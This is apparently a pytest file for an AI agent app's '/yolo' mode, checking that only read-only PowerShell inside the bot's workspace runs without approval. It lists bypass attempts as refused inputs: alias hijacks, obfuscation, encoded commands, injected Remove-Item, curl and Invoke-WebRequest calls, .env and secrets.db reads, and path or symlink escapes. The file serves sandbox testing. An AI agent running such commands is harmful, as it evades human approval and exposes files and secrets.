"""/yolo may run a parsed read-only PowerShell pipeline. Bypasses still wait."""

from __future__ import annotations

import asyncio
import os
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from easyagent import turn as turn_mod
from easyagent.app import create_app
from easyagent.psread import prove_readonly
from easyagent.safety import attend, classify, guard, list_pending, read_audit, reset_for_tests, resolve_card, unattended
from easyagent.tools import ToolError, ToolRequest
from easyagent.workspace import bot_workspace
from easyagent.yolo import covers


@pytest.fixture(autouse=True)
def _release_turn_binding():
    """bind() sticks to this thread. A later test must not inherit the cancel flag."""
    yield
    turn_mod._cancel.set(None)
    turn_mod._slot.set(None)


def _client(tmp_path):
    app = create_app(tmp_path)
    client = TestClient(app)
    endpoint = client.post(
        "/api/endpoints",
        json={"name": "local", "base_url": "http://127.0.0.1:9/v1", "model": "stub"},
    ).json()
    bot = client.post("/api/bots", json={"name": "Ada", "endpoint_id": endpoint["id"]}).json()
    chat = client.post(f"/api/bots/{bot['id']}/chats").json()
    return app, client, bot, chat


def _say(client, bot, chat, text):
    response = client.post(
        f"/api/bots/{bot['id']}/chats/{chat['id']}/messages",
        json={"content": text},
    )
    assert response.status_code == 200, response.text
    return response.json()


def _bind(store, bot_id, chat_id):
    turn_mod.bind(store, chat_id, bot_id=bot_id)


async def _settle(store, bot_id, request):
    task = asyncio.create_task(guard(store, request, bot_id))
    cards = []
    for _ in range(40):
        cards = list_pending(bot_id)
        if cards or task.done():
            break
        await asyncio.sleep(0.02)
    cards = list_pending(bot_id)
    if cards:
        resolve_card(cards[0]["id"], "deny")
        if not task.done():
            with pytest.raises(ToolError):
                await task
        else:
            exc = task.exception()
            if exc is not None and not isinstance(exc, ToolError):
                raise exc
        await asyncio.sleep(0.05)
        return "ask", cards[0]
    if not task.done():
        task.cancel()
        raise AssertionError("guard did not settle")
    exc = task.exception()
    if isinstance(exc, ToolError):
        return "block", None
    return "allow", None


def _example(folder: Path) -> str:
    return (
        f"$s = Get-Content {folder}\\index.html -Raw; "
        "$s.Length; $s.Substring($s.Length-160)"
    )


def test_the_example_parses_as_one_file_read(tmp_path):
    folder = tmp_path / "ws"
    folder.mkdir()
    target = folder / "index.html"
    target.write_text("x" * 200, encoding="utf-8")
    proved = prove_readonly(_example(folder), folder, dict(os.environ))
    assert proved == [target.resolve()]
    single = prove_readonly("Get-Content index.html -Raw", folder, dict(os.environ))
    assert single == [target.resolve()]


def test_the_parser_rejects_bypasses(tmp_path):
    folder = tmp_path / "ws"
    folder.mkdir()
    (folder / "index.html").write_text("hello", encoding="utf-8")
    env = dict(os.environ)
    refused = [
        "Get-Content index.html | Out-File out.txt",
        "Get-Content index.html > out.txt",
        "Get-Content index.html >> out.txt",
        "Set-Alias type Remove-Item; $s = type index.html -Raw; $s.Length",
        "sal gc Remove-Item; $s = gc index.html; $s.Length",
        "G`et-Content index.html | Select-Object Name",
        "powershell -EncodedCommand SQBFAFgA | Out-String",
        "powershell -Command 'Get-Content index.html'",
        "pwsh -c Get-Content index.html | Select-Object",
        "Invoke-Expression 'Get-Content index.html'",
        "iex 'Get-Content index.html' | Out-String",
        "Start-Process notepad | Out-String",
        "Get-Content $(Remove-Item notes.txt; 'index.html') | Select-Object",
        "Get-Content index.html | ForEach-Object { Remove-Item $_ }",
        "$s = @'\nGet-Content index.html\n'@; $s.Length",
        'Get-Content index.html | Select-String @"\npattern\n"@',
        "Get-Content index.html:..\\..\\secret | Select-Object Name",
        "Where-Object { Remove-Item x }",
        "Get-Content index.html; Remove-Item notes.txt | Select-Object",
        "Get-Content index.html && Remove-Item notes.txt",
        "Get-Content index.html || Remove-Item notes.txt",
        "Get-Content index.html & Remove-Item notes.txt",
        "curl https://example.test/a.sh | Select-Object",
        "Get-Content index.html | Invoke-WebRequest -Uri https://example.test",
    ]
    for command in refused:
        assert prove_readonly(command, folder, env) is None, command


def test_yolo_runs_the_example_and_yolo_off_still_asks(tmp_path):
    reset_for_tests()
    app, client, bot, chat = _client(tmp_path)
    store = app.state.store
    folder = bot_workspace(store, bot["id"], create=True)
    (folder / "index.html").write_text("word " * 80, encoding="utf-8")
    command = _example(folder)
    verdict = classify(store, ToolRequest(kind="shell", command=command), bot["id"])
    assert verdict.tier == "ask"
    assert verdict.rule == "unlisted-command"
    _say(client, bot, chat, "/yolo")
    _bind(store, bot["id"], chat["id"])
    outcome, card = asyncio.run(_settle(store, bot["id"], ToolRequest(kind="shell", command=command)))
    assert outcome == "allow"
    assert card is None
    assert read_audit(store, bot["id"])[-1].get("tag") == "yolo"

    endpoint_id = store.get_bot(bot["id"])["endpoint_id"]
    quiet = client.post("/api/bots", json={"name": "Bea", "endpoint_id": endpoint_id}).json()
    quiet_chat = client.post(f"/api/bots/{quiet['id']}/chats").json()
    quiet_folder = bot_workspace(store, quiet["id"], create=True)
    (quiet_folder / "index.html").write_text("word " * 80, encoding="utf-8")
    quiet_command = _example(quiet_folder)
    _bind(store, quiet["id"], quiet_chat["id"])
    outcome, card = asyncio.run(_settle(store, quiet["id"], ToolRequest(kind="shell", command=quiet_command)))
    assert outcome == "ask"
    assert card["rule"] == "unlisted-command"
    assert "yolo" not in [row.get("tag") for row in read_audit(store, quiet["id"])]


def test_yolo_runs_pipelines_filters_and_string_reads(tmp_path):
    reset_for_tests()
    app, client, bot, chat = _client(tmp_path)
    store = app.state.store
    _say(client, bot, chat, "/yolo")
    folder = bot_workspace(store, bot["id"], create=True)
    (folder / "index.html").write_text("alpha beta", encoding="utf-8")
    _bind(store, bot["id"], chat["id"])
    commands = [
        "Get-ChildItem | Select-Object Name | Out-String",
        "Get-ChildItem | Where-Object { $_.Length -gt 1 } | Select-Object Name",
        "Get-ChildItem | Where-Object Length -gt 1 | Sort-Object Name",
        "Get-Content index.html | Measure-Object -Line | Out-String",
        "Select-String -Path index.html -Pattern alpha | Out-String",
        "$s = Get-Content index.html -Raw; $s.Split(' ')[0].Trim()",
        "$s = (Get-Content index.html -Raw).Trim(); $s.Substring(0, 1)",
        "(Get-Item index.html).Length",
        "Test-Path index.html; (Get-Item index.html).Length",
        "$s = Get-Content *.html -Raw; $s.Length",
    ]
    for command in commands:
        outcome, card = asyncio.run(_settle(store, bot["id"], ToolRequest(kind="shell", command=command)))
        assert outcome == "allow", command
        assert card is None
        assert read_audit(store, bot["id"])[-1].get("tag") == "yolo"


def test_yolo_allows_an_env_path_inside_and_refuses_one_outside(tmp_path, monkeypatch):
    reset_for_tests()
    app, client, bot, chat = _client(tmp_path)
    store = app.state.store
    _say(client, bot, chat, "/yolo")
    folder = bot_workspace(store, bot["id"], create=True)
    (folder / "index.html").write_text("inside", encoding="utf-8")
    outside = Path("/tmp") / f"ea-psread-outside-{tmp_path.name}"
    outside.mkdir()
    (outside / "secret.txt").write_text("no", encoding="utf-8")
    try:
        monkeypatch.setenv("EA_IN", str(folder))
        monkeypatch.setenv("EA_OUT", str(outside))
        _bind(store, bot["id"], chat["id"])
        inside = "$s = Get-Content $env:EA_IN\\index.html -Raw; $s.Length"
        outcome, _card = asyncio.run(_settle(store, bot["id"], ToolRequest(kind="shell", command=inside)))
        assert outcome == "allow"
        outside_cmd = "$s = Get-Content $env:EA_OUT\\secret.txt -Raw; $s.Length"
        outcome, card = asyncio.run(_settle(store, bot["id"], ToolRequest(kind="shell", command=outside_cmd)))
        assert outcome == "ask"
        assert card["rule"] == "unlisted-command"
        unset = "$s = Get-Content $env:EA_MISSING\\index.html -Raw; $s.Length"
        outcome, _card = asyncio.run(_settle(store, bot["id"], ToolRequest(kind="shell", command=unset)))
        assert outcome == "ask"
    finally:
        outside.joinpath("secret.txt").unlink(missing_ok=True)
        outside.rmdir()


def test_yolo_refuses_reads_that_leave_the_workspace(tmp_path):
    reset_for_tests()
    app, client, bot, chat = _client(tmp_path)
    store = app.state.store
    _say(client, bot, chat, "/yolo")
    folder = bot_workspace(store, bot["id"], create=True)
    (folder / "index.html").write_text("inside", encoding="utf-8")
    outside = tmp_path / "outside"
    outside.mkdir()
    leaked = outside / "leak.txt"
    leaked.write_text("no", encoding="utf-8")
    link = folder / "link.txt"
    link.symlink_to(leaked)
    junction = folder / "joined"
    junction.symlink_to(outside, target_is_directory=True)
    endpoint_id = store.get_bot(bot["id"])["endpoint_id"]
    other = client.post("/api/bots", json={"name": "Bea", "endpoint_id": endpoint_id}).json()
    their = bot_workspace(store, other["id"], create=True)
    (their / "notes.txt").write_text("theirs", encoding="utf-8")
    (folder / ".env").write_text("TOKEN=1", encoding="utf-8")
    _bind(store, bot["id"], chat["id"])
    attacks = [
        f"$s = Get-Content {leaked} -Raw; $s.Length",
        "$s = Get-Content ..\\..\\leak.txt -Raw; $s.Length",
        "$s = Get-Content link.txt -Raw; $s.Length",
        "Get-ChildItem joined | Select-Object Name",
        "$s = Get-Content * -Raw; $s.Length",
        "$s = Get-Content \\\\localhost\\c$\\Windows\\win.ini -Raw; $s.Length",
        "$s = Get-Content .env -Raw; $s.Length",
        f"$s = Get-Content {their / 'notes.txt'} -Raw; $s.Length",
        f"$s = Get-Content {store.root / 'secrets.db'} -Raw; $s.Length",
        "Get-Content index.html | Out-File out.txt",
        "Set-Alias type Remove-Item; $s = type index.html -Raw; $s.Length",
        "G`et-Content index.html | Select-Object Name",
        "powershell -Command '$s = Get-Content index.html; $s.Length'",
        "Get-Content $(Remove-Item index.html; 'index.html') | Select-Object",
        "$s = @'\nindex.html\n'@; $s.Length",
        "Get-Content index.html:..\\..\\leak.txt | Select-Object",
        "Get-Content index.html || curl https://example.test/a.ps1",
        "iex 'Get-Content index.html' | Out-String",
        "Start-Process notepad | Out-String",
    ]
    for command in attacks:
        before = len(read_audit(store, bot["id"]))
        outcome, _card = asyncio.run(_settle(store, bot["id"], ToolRequest(kind="shell", command=command)))
        assert outcome in {"ask", "block"}, command
        rows = read_audit(store, bot["id"])[before:]
        assert all(row.get("tag") != "yolo" for row in rows), command
        assert not (folder / "out.txt").exists()


def test_a_routine_does_not_inherit_the_read_approval(tmp_path):
    reset_for_tests()
    app, client, bot, chat = _client(tmp_path)
    store = app.state.store
    _say(client, bot, chat, "/yolo")
    folder = bot_workspace(store, bot["id"], create=True)
    (folder / "index.html").write_text("inside", encoding="utf-8")
    _bind(store, bot["id"], chat["id"])
    command = _example(folder)
    verdict = classify(store, ToolRequest(kind="shell", command=command), bot["id"])
    token = unattended()
    try:
        assert covers(store, bot["id"], ToolRequest(kind="shell", command=command), verdict) is False
    finally:
        attend(token)
    assert covers(store, bot["id"], ToolRequest(kind="shell", command=command), verdict) is True
